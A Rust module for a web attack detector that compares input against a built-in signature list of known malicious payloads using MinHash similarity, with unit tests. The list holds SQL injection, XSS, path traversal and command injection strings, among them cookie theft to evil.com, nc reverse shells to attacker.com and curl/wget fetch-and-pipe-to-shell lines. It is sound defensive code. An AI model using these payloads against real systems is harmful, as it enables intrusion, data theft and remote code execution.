//! Payload Embedding Similarity
//!
//! Detects attacks by measuring similarity to known malicious payloads.
#![allow(dead_code)]
//! Uses MinHash for efficient approximate similarity search, which allows
//! comparing against thousands of known attack signatures quickly.
//!
//! # How It Works
//!
//! 1. Known attack payloads are converted to MinHash signatures
//! 2. Incoming payloads are similarly converted
//! 3. Jaccard similarity is approximated using MinHash
//! 4. High similarity to known attacks indicates potential threat
//!
//! This catches attacks that are variations of known payloads, even if
//! they don't exactly match regex patterns.

use super::ngram::{CharNGramTokenizer, NGramFeatures};
use rustc_hash::FxHasher;
use std::hash::{Hash, Hasher};

/// Configuration for payload similarity detection
#[derive(Debug, Clone)]
pub struct SimilarityConfig {
    /// Number of hash functions for MinHash (more = more accurate but slower)
    pub num_hashes: usize,
    /// Minimum similarity to flag as suspicious (0.0 - 1.0)
    pub alert_threshold: f32,
    /// Similarity score weight in overall detection
    pub weight: f32,
}

impl Default for SimilarityConfig {
    fn default() -> Self {
        Self {
            num_hashes: 128,
            alert_threshold: 0.5,
            weight: 0.3,
        }
    }
}

/// MinHash signature for efficient similarity estimation
#[derive(Debug, Clone)]
pub struct MinHashSignature {
    /// The minimum hash values
    values: Vec<u64>,
}

impl MinHashSignature {
    /// Create a MinHash signature from n-gram features
    fn from_features(features: &NGramFeatures, num_hashes: usize) -> Self {
        let mut values = vec![u64::MAX; num_hashes];

        for &ngram_hash in features.features.keys() {
            for (i, min_val) in values.iter_mut().enumerate() {
                // Use different hash "seed" for each position
                let hash = permute_hash(ngram_hash, i as u64);
                *min_val = (*min_val).min(hash);
            }
        }

        Self { values }
    }

    /// Estimate Jaccard similarity with another signature
    fn similarity(&self, other: &MinHashSignature) -> f32 {
        if self.values.len() != other.values.len() || self.values.is_empty() {
            return 0.0;
        }

        let matching = self
            .values
            .iter()
            .zip(&other.values)
            .filter(|(a, b)| a == b)
            .count();

        matching as f32 / self.values.len() as f32
    }
}

/// Known attack payload with its signature
#[derive(Debug, Clone)]
struct KnownPayload {
    /// Original payload (for reference)
    payload: String,
    /// Attack category
    category: PayloadCategory,
    /// MinHash signature
    signature: MinHashSignature,
}

/// Category of known payload
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PayloadCategory {
    SqlInjection,
    Xss,
    CommandInjection,
    PathTraversal,
    Deserialization,
    Xxe,
    Ssti,
}

/// Result of similarity analysis
#[derive(Debug, Clone)]
pub struct SimilarityResult {
    /// Maximum similarity score found
    pub max_similarity: f32,
    /// Category of most similar known payload
    pub category: Option<PayloadCategory>,
    /// Whether this exceeds the alert threshold
    pub is_suspicious: bool,
    /// Number of known payloads compared against
    pub comparisons_made: usize,
}

/// Payload similarity detector
pub struct PayloadSimilarity {
    config: SimilarityConfig,
    tokenizer: CharNGramTokenizer,
    /// Known malicious payloads with signatures
    known_payloads: Vec<KnownPayload>,
}

impl PayloadSimilarity {
    /// Create a new similarity detector
    pub fn new() -> Self {
        let mut detector = Self {
            config: SimilarityConfig::default(),
            tokenizer: CharNGramTokenizer::new(),
            known_payloads: Vec::new(),
        };
        detector.initialize_known_payloads();
        detector
    }

    /// Create with custom configuration
    pub fn with_config(config: SimilarityConfig) -> Self {
        let mut detector = Self {
            config,
            tokenizer: CharNGramTokenizer::new(),
            known_payloads: Vec::new(),
        };
        detector.initialize_known_payloads();
        detector
    }

    /// Initialize with known attack payloads
    fn initialize_known_payloads(&mut self) {
        // SQL Injection payloads
        let sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' OR '1'='1",
            "admin'--",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT username, password FROM users--",
            "1 UNION SELECT 1,2,3,4,5--",
            "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--",
            "1; DROP TABLE users--",
            "'; DROP TABLE users; --",
            "1'; EXEC xp_cmdshell('dir')--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING(username,1,1)='a'--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "1 AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "1' WAITFOR DELAY '0:0:5'--",
            "' OR BENCHMARK(10000000,SHA1('test'))--",
            "' OR pg_sleep(5)--",
            "1' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
            "1' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
        ];

        // XSS payloads
        let xss_payloads = [
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "javascript:alert('XSS')",
            "<a href=\"javascript:alert('XSS')\">click</a>",
            "'-alert(1)-'",
            "\";alert(1);//",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
            "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoMSk='))\">",
            "<svg/onload=alert(1)>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        ];

        // Command injection payloads
        let cmd_payloads = [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "|| cat /etc/passwd",
            "&& cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; ls -la",
            "| ls -la",
            "; whoami",
            "| whoami",
            "; id",
            "& ping -c 10 127.0.0.1 &",
            "; nc -e /bin/sh attacker.com 1234",
            "| nc attacker.com 1234 -e /bin/bash",
            "; wget http://evil.com/shell.sh | bash",
            "; curl http://evil.com/shell.sh | sh",
            "& nslookup evil.com &",
        ];

        // Path traversal payloads
        let traversal_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....\\\\....\\\\....\\\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%255c..%255c..%255cwindows/win.ini",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "php://filter/convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "....//....//....//....//etc/passwd%00.jpg",
        ];

        // Add all payloads
        for payload in sqli_payloads {
            self.add_known_payload(payload, PayloadCategory::SqlInjection);
        }
        for payload in xss_payloads {
            self.add_known_payload(payload, PayloadCategory::Xss);
        }
        for payload in cmd_payloads {
            self.add_known_payload(payload, PayloadCategory::CommandInjection);
        }
        for payload in traversal_payloads {
            self.add_known_payload(payload, PayloadCategory::PathTraversal);
        }
    }

    /// Add a known malicious payload
    fn add_known_payload(&mut self, payload: &str, category: PayloadCategory) {
        let features = self.tokenizer.extract(payload);
        let signature = MinHashSignature::from_features(&features, self.config.num_hashes);

        self.known_payloads.push(KnownPayload {
            payload: payload.to_string(),
            category,
            signature,
        });
    }

    /// Analyze a payload for similarity to known attacks
    pub fn analyze(&self, input: &str) -> SimilarityResult {
        if input.is_empty() || self.known_payloads.is_empty() {
            return SimilarityResult {
                max_similarity: 0.0,
                category: None,
                is_suspicious: false,
                comparisons_made: 0,
            };
        }

        let features = self.tokenizer.extract(input);
        let input_signature = MinHashSignature::from_features(&features, self.config.num_hashes);

        let mut max_similarity = 0.0f32;
        let mut best_category = None;

        for known in &self.known_payloads {
            let similarity = input_signature.similarity(&known.signature);
            if similarity > max_similarity {
                max_similarity = similarity;
                best_category = Some(known.category);
            }
        }

        SimilarityResult {
            max_similarity,
            category: best_category,
            is_suspicious: max_similarity >= self.config.alert_threshold,
            comparisons_made: self.known_payloads.len(),
        }
    }

    /// Quick check if payload might be malicious (for fast filtering)
    pub fn quick_check(&self, input: &str) -> bool {
        let result = self.analyze(input);
        result.is_suspicious
    }

    /// Get the number of known payloads
    pub fn known_payload_count(&self) -> usize {
        self.known_payloads.len()
    }
}

impl Default for PayloadSimilarity {
    fn default() -> Self {
        Self::new()
    }
}

/// Permute a hash value using a seed (for MinHash)
fn permute_hash(hash: u64, seed: u64) -> u64 {
    let mut hasher = FxHasher::default();
    hash.hash(&mut hasher);
    seed.hash(&mut hasher);
    hasher.finish()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_known_payload_loading() {
        let similarity = PayloadSimilarity::new();
        assert!(similarity.known_payload_count() > 0);
    }

    #[test]
    fn test_sqli_similarity() {
        let similarity = PayloadSimilarity::new();

        // Similar to known SQLi
        let result = similarity.analyze("' OR '1'='1' -- comment");
        assert!(result.max_similarity > 0.3);
        assert_eq!(result.category, Some(PayloadCategory::SqlInjection));
    }

    #[test]
    fn test_xss_similarity() {
        let similarity = PayloadSimilarity::new();

        // Similar to known XSS
        let result = similarity.analyze("<script>alert('test')</script>");
        assert!(result.max_similarity > 0.3);
        assert_eq!(result.category, Some(PayloadCategory::Xss));
    }

    #[test]
    fn test_cmd_injection_similarity() {
        let similarity = PayloadSimilarity::new();

        // Similar to known command injection
        let result = similarity.analyze("; cat /etc/shadow");
        assert!(result.max_similarity > 0.3);
        assert_eq!(result.category, Some(PayloadCategory::CommandInjection));
    }

    #[test]
    fn test_traversal_similarity() {
        let similarity = PayloadSimilarity::new();

        // Similar to known path traversal
        let result = similarity.analyze("../../../../etc/shadow");
        assert!(result.max_similarity > 0.3);
        assert_eq!(result.category, Some(PayloadCategory::PathTraversal));
    }

    #[test]
    fn test_benign_payload() {
        let similarity = PayloadSimilarity::new();

        // Benign input should have low similarity
        let result = similarity.analyze("Hello, this is a normal search query");
        assert!(result.max_similarity < 0.4);
    }

    #[test]
    fn test_obfuscated_sqli() {
        let similarity = PayloadSimilarity::new();

        // Obfuscated SQLi should still have some similarity
        let result = similarity.analyze("'/**/OR/**/'1'='1'/**/--");
        // May have lower similarity due to obfuscation but should still detect
        assert!(result.max_similarity > 0.1);
    }

    #[test]
    fn test_minhash_signature() {
        let tokenizer = CharNGramTokenizer::new();

        let features1 = tokenizer.extract("SELECT * FROM users");
        let features2 = tokenizer.extract("SELECT * FROM users");
        let features3 = tokenizer.extract("Hello world");

        let sig1 = MinHashSignature::from_features(&features1, 64);
        let sig2 = MinHashSignature::from_features(&features2, 64);
        let sig3 = MinHashSignature::from_features(&features3, 64);

        // Same input should have high similarity
        assert!((sig1.similarity(&sig2) - 1.0).abs() < 0.1);

        // Different input should have lower similarity
        assert!(sig1.similarity(&sig3) < 0.5);
    }
}
